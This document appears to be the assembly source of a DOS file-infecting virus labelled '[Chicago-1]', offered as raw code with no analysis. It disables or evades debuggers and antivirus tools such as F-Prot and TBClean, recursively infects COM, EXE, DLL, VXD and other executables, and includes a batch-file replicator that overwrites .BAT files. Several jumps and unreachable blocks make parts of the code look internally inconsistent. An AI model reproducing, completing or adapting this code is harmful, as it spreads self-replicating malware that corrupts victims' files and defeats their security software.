code    segment byte public
        assume  cs: code
        org     100h
id      =       'EK'

begin:
        call    next                            ; Get Delta Offset

next:   pop     bp
        sub     bp, offset next

        push    cs
        push    cs
        pop     ds
        pop     es

        mov     byte ptr [bp + lock_keys + 3], 244
                                                ; Prefetch Cue Unchanged
lock_keys:
        mov     al, 128                         ; Screws DEBUG
        out     21h, al                         ; If Tracing, Lock Keyboard

        mov     ax, 4653h                       ; Remove F-Prot Utils
        mov     bx, 1
        mov     cx, 2
        rep     int  2Fh


        mov     byte ptr cs:[tb_here][bp], 0    ; Reset TB Flag
        xor     dx, dx
        mov     ds, dx
        mov     ax, word ptr ds:[6]
        dec     ax
        mov     ds, ax

        mov     cx, 0FFFFh                      ; CX = 64k
        mov     si, dx                          ; SI = 0

look_4_tbclean:
        mov     ax, word ptr ds:[si]
        xor     ax, 0A5F3h
        je      check_it                        ; Jump If It's TBClean
look_again:
        inc     si                              ; Continue Search
        loop    look_4_tbclean
        jmp     not_found                       ; TBClean Not Found

check_it:
        mov     ax, word ptr ds:[si+4]
        xor     ax, 0006h
        jne     look_again
        mov     ax, word ptr ds:[si+10]
        xor     ax, 020Eh
        jne     look_again
        mov     ax, word ptr ds:[si+12]
        xor     ax, 0C700h
        jne     look_again
        mov     ax, word ptr ds:[si+14]
        xor     ax, 406h
        jne     look_again

        mov     bx, word ptr ds:[si+17]         ; Steal REAL Int 1 Offset
        mov     byte ptr ds:[bx+16], 0CFh       ; Replace With IRET

        mov     bx, word ptr ds:[si+27]         ; Steal REAL Int 3 Offset
        mov     byte ptr ds:[bx+16], 0CFh       ; Replece With IRET

        mov     byte ptr cs:[tb_here][bp], 1    ; Set The TB Flag On

        mov     bx, word ptr ds:[si+51h]        ; Get 2nd Segment of
        mov     word ptr cs:[tb_int2][bp], bx   ; Vector Table

        mov     bx, word ptr ds:[si-5]          ; Get Offset of 1st Copy
        mov     word ptr cs:[tb_ints][bp], bx   ; of Vector Table

not_found:
        mov     cx, 9EBh
        mov     ax, 0FE05h
        jmp     $-2
        add     ah, 3Bh                         ; Hlt Instruction (Kills TD)
        jmp     $-10

        mov     ax, 0CA00h                      ; Exit It TBSCANX In Mem
        mov     bx, 'TB'
        int     2Fh

        cmp     al, 0
        je      okay
        ret

okay:

        mov     ah, 47h
        xor     dl, dl
        lea     si, [bp+offset dir_buff+1]       ; Save Original Directory
        int     21h

        push    es                              ; New DTA
        push    ds
        mov     ah, 1Ah
        lea     dx, [bp+offset newDTA]
        int     21h

        lea     di, [bp+offset origCSIP2]       ; Save For EXE
        lea     si, [bp+offset origCSIP]
        mov     cx, 4
        rep     movsw

        mov     byte ptr [bp+numinfected], 0

        mov     ax, 3524h                       ; New INT 24h Handler
        int     21h
        mov     ax, 2524h
        mov     dx, offset Int24
        int     21h

traverse        proc    near

        push    bp
        push    bp
        pop     di

        mov     bp, sp                          ; Set Stack Frame
        sub     sp, 128

        mov     ah, 4Eh                         ; Find First Directory
        mov     cx, 00010000b                   ; Attributes
        lea     dx,[di + files]
        int     21h
        jc      leave_traverse                  ; No Directories Present

check_dir:
        cmp     byte ptr [bp - 107], 16         ; Directory?
        jne     another_dir                     ; No, Try Again
        cmp     byte ptr [bp - 98], '.'         ; "." or ".."?
        je      another_dir                     ; Keep Going

        mov     ah, 3Bh                         ; Change Directory
        lea     dx, [bp - 98]
        int     21h

        call    traverse                        ; Call Ourself

        pushf
        mov     ah, 3Bh                         ; Change Directory
        lea     dx, [di + up_dir]
        int     21h
        popf

        jnc     done_searching

another_dir:
        mov     ah, 4Fh                         ; Find Next Directory
        int     21h
        jnc     check_dir

leave_traverse:

        lea     dx, [di + com_spec]
        call    infect
        lea     dx, [bp+offset bat_spec]        ; Find BAT's
        mov     byte ptr [bp+doingbat], 1
        mov     ah, 4Eh
        call    infect
        lea     dx, [di + bin_spec]
        call    infect
        lea     dx, [di + ovr_spec]
        call    infect
        lea     dx, [di + exe_spec]
        call    infect
        lea     dx, [di + vxd_spec]
        call    infect
        lea     dx, [di + dll_spec]
        call    infect

done_searching:
        mov     sp, bp                          ; Restore Old Stack Frame
        pop     bp                              ; Restore BP
        ret

up_dir  db      "..",0                          ; Parent directory name
files   db      "*.*",0                         ; Directories to search for
traverse  endp
        pop     ds                              ; Restore DTA
        pop     es
        mov     ah, 1Ah
        mov     dx, 80h
        int     21h

        cmp     sp, id                          ; EXE?
        jne     infect

restore_exe:                                    ; Restore EXE
        mov     ax, ds
        add     ax, 10h
        add     cs:[bp+word ptr origCSIP2+2], ax
        add     ax, cs:[bp+word ptr origSPSS2]
        cli
        mov     ss, ax
        mov     sp, cs:[bp+word ptr origSPSS2+2]
        sti
        jmp     after

before: db      00EAh                           ; Jump To The Original Code
origCSIP2       db      ?
origSPSS2       dd      ?
origCSIP        db      ?
origSPSS        dd      ?

after:  jmp     before

old3    db      0CDh, 20h, 0
restore_com:                                    ; Restore COM
        mov     di, 100h
        push    di
        lea     si, [bp+offset old3]
        movsw
        movsb

return: ret                                     ; Jump To Original Code

infect:
        mov     cx, 7
        mov     ah, 4Eh                         ; Find First File
findfirstnext:
        int     21h
        jc      return

        cmp     word ptr [bp+newDTA+33], 'AM'   ; COMMAND.COM?
        mov     ah, 4Fh
        jz      findfirstnext                   ; Yes, So Get Another File

        mov     ax, 4300h                       ; Function: Get File Attrib
        lea     dx, [bp+newDTA+30]              ; Get Attributes
        int     21h                             ; Execute Function

        push    cx                              ; Save Attribute / Filename
        push    dx

        mov     ax, 4301h                       ; Clear Attributes
        push    ax
        xor     cx, cx
        int     21h

        mov     ax, 3D02h                       ; Open File, Read/Write
        lea     dx, [bp+newDTA+30]
        int     21h
        xchg    ax, bx

        mov     ax, 5700h                       ; Get File Time/Date
        int     21h
        push    cx                              ; Save Time/Date
        push    dx

        mov     ah, 3Fh
        mov     cx, 1Ah                         ; Read Into File
        lea     dx, [bp+offset readbuffer]
        int     21h

        mov     ax, 4202h                       ; Move Pointer To End Of File
        xor     cx, cx
        cwd
        int     21h

        cmp     word ptr [bp+offset readbuffer], 'ZM'   ; EXE?
        jz      checkexe

        mov     cx, word ptr [bp+offset readbuffer+1]
        add     cx, heap-begin+3                ; CX = Filesize
        cmp     ax, cx
        jz      jmp_close                       ; Already Infected

        cmp     ax, 65535-(endheap-begin)       ; Too Large To Infect?
        ja      jmp_close

        lea     di, [bp+offset old3]            ; Save First Three Bytes
        lea     si, [bp+offset readbuffer]
        movsb
        movsw

        mov     cx, 3                           ; Encoded Jump To Virus
        sub     ax, cx
        mov     word ptr [bp+offset readbuffer+1], ax
        mov     dl, 0E9h
        mov     byte ptr [bp+offset readbuffer], dl
checkexe:
        cmp     word ptr [bp+offset readbuffer+10h], id
        jnz     skipp                           ; Not Infected, So Infect It

        jmp     short continue_infect
jmp_close:
        jmp     close                           ; Infected, So Quit

skipp:  lea     di, [bp+origCSIP]
        lea     si, [bp+readbuffer+14h]
        movsw                                   ; Save CS and IP
        movsw

        sub     si, 0Ah                         ; Save SS and SP
        movsw
        movsw

        push    bx                              ; Filename
        mov     bx, word ptr [bp+readbuffer+8]  ; Header Size
        mov     cl, 4
        shl     bx, cl

        push    dx
        push    ax

        sub     ax, bx                          ; File Size - Header Size
        sbb     dx, 0

        mov     cx, 10h
        div     cx

        mov     word ptr [bp+readbuffer+0Eh], ax ; SS
        mov     word ptr [bp+readbuffer+10h], id ; SP
        mov     word ptr [bp+readbuffer+14h], dx ; IP
        mov     word ptr [bp+readbuffer+16h], ax ; CS

        pop     ax
        pop     dx

        add     ax, heap-begin
        adc     dx, 0

        mov     cl, 9
        push    ax
        shr     ax, cl
        ror     dx, cl
        stc
        adc     dx, ax
        pop     ax
        and     ah, 1

        mov     word ptr [bp+readbuffer+2], ax
        mov     word ptr [bp+readbuffer+4], dx  ; Fix Header

        pop     bx
        mov     cx, 1Ah

continue_infect:

        cmp     [bp+doingbat], 1
        jne     notdoingbat

        mov     ah, 40h
        mov     cx, endofbatchvirus-batchvirus  ; Add Virus To The End
        lea     dx, [bp+offset batchvirus]
        int     21h
        jmp     afterinfect

notdoingbat:
        mov     ah, 40h
        mov     cx, heap-begin                  ; Add Virus To The End
        lea     dx, [bp+offset begin]
        int     21h

        mov     ax, 4200h
        xor     cx, cx                          ; Move Pointer To Beginning
        cwd
        int     21h

        mov     ah, 40h
        mov     cx, 1Ah                         ; Write Encoded Jump To Virus
        lea     dx, [bp+offset readbuffer]
        int     21h

afterinfect:

        inc     [bp+numinfected]                  ; Infection Good

close:
        mov     ax, 5701h                       ; Set Orig Date and Time
        pop     dx
        pop     cx
        int     21h

        mov     ah, 3Eh                         ; Close File
        int     21h

        pop     ax                              ; Restore Attributes
        pop     dx
        pop     cx
        int     21h

        cmp     [bp+numinfected], 4
        jae     bye
        mov     ah, 4Fh                         ; No, So Find Another File
        jmp     findfirstnext

        mov     ax, 2524h                       ; New INT 24h Handler
        pop     dx
        pop     ds
        int     21h

        mov     ah, 3Bh                         ; Function: Change Directory
        lea     dx, [bp+dir_buff]               ; Restore Current Directory
        int     21h                             ; Execute Function

bye:    ret

Int24:  mov     ax, 3                           ; Error Handling
        iret    

note        db  "[Chicago-1]"

batchvirus      db      10,13,'@Ctty Nul'
                db      10,13,'For %%F In (*.Bat) Do Copy %0.BAT %%F'
                db      10,13,'CD\'
                db      10,13,'For %%F In (*.Bat) Do Copy %0.BAT %%F'
                db      10,13,'Ctty Con'

endofbatchvirus:

bat_spec        db      '*.BAT',0               ; BAT Filespec
bin_spec        db      '*.BIN',0               ; BIN Filespec
com_spec        db      '*.COM',0               ; COM Filespec
dll_spec        db      '*.DLL',0               ; DLL Filespec
exe_spec        db      '*.EXE',0               ; EXE Filespec
ovr_spec        db      '*.OV?',0               ; OV? Filespec
vxd_spec        db      '*.VXD',0               ; VXD Filespec

heap:
donebin         db      0
dir_buff        db      64 dup (0)              ; Current Dir Buffer
newdta          db      43 dup (?)              ; New Disk Transfer Access
doingbat        db      ?
numinfected     db      ?                       ; Number Of Files Infected
tb_ints         dd      0
tb_int2         dd      0
tb_here         db      0
readbuffer      db      1ah dup (?)
endheap:

code    ends
        end begin
        